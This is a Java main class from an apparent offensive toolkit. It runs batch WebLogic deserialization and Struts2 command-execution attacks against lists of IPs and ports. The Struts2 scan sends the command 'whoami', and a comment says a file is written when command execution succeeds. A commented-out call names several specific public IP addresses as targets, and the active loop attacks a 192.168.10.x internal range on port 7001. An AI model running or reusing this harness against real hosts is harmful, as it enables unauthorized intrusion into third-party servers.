package com.mtx.xiatian;

import java.util.ArrayList;
import java.util.List;
import java.util.TreeMap;

import com.mtx.xiatian.hacker.MTX_AttackWeblogic;
import com.mtx.xiatian.hacker.struts2Scan.Struts2ScanManager;


/**
 * 批量渗透测试的主程序
 * https://github.com/hktalent/MTX_HackerTools.git
 * @author mtx
 *
 */
public class Main
{
	protected MTX_AttackWeblogic ma = null;
	protected Struts2ScanManager sm;
	public Main()
	{
		ma = new MTX_AttackWeblogic();
	    sm = Struts2ScanManager.getInstance();
	    ma.useMysql();
		ma.hvLastScan = false;
	}
	
	public void doCheckZfwz()
	{
		ma.query("select url from ", new ArrayList<TreeMap<String, Object>>()
				{
			
				});
	}
	
	/**
	 * 测试weblogic java反序列化漏洞
	 * @param ip
	 * @param port
	 */
	public void testWeblogic(String ip, String port)
	{
		ma.connSvr(ip,  port, null, null);
	}
	/**
	 * 渗透检测
	 * @param ips  ip之间分号、逗号分隔；58.210.227.26;60.173.247.15
	 * @param ports 7001;7001,8001
	 * @param path
	 */
	public  void testWeblogic_Struts2(String ips, String ports, String path)
	{
		String s1 = "[;,]";
		String []a = ips.split(s1), a1 = ports.split("[;]"), a3;
		int x = 0, y = a1.length;
		List<Object[]> list1 = new ArrayList<Object[]>();
		// ip循环
		for(int i = 0, j = a.length; i < j; i++)
		{
			// 每个ip对应的端口用；分割，每个端口之间用,分开
			// 端口的分组数量和ip个数应该对等、相同，否则就直接使用上一组的ip
			x = i;
			if(x >= y)x--;
			a3 = a1[x].split(",");
			for(int w = 0, k = a3.length; w < k; w++)
			{
				// 多线程抓取form表单，找到action路径，尝试struts2漏洞检测
				// 如果path有非null值就直接使用
				;// 还没有写
				if(null != path)
					sm.doS2Scan("http://" +a[i] + ":" +  a3[w] + path, list1, "whoami");
				else
				{
					;
				}
				
				// 如果有漏洞，会在data目录产生一个命令执行的txt文件
				ma.connSvr(a[i],  a3[w], null, null);
			}
		}
		
	}
	/**
	 * @param args
	 */
	public static void main(String[] args)
	{
		// 如果当前环境有代理，就使用系统设置的代理
		System.setProperty("java.net.useSystemProxies", "true");
		Main main = new Main();
//		main.testWeblogic_Struts2(
//				"60.173.247.15;222.168.33.117;58.210.227.26;218.62.83.78;183.131.128.215;222.168.33.108;124.42.10.247", 
//				"7001;8001;7001;8080;80;9001;80,7001", 
//				"/login");
		// 内部10网段所有主机
		for(int i = 118; i < 256;  i++)
		{
			main.testWeblogic("192.168.10." + i, "7001");
		}
		
		
	}
}
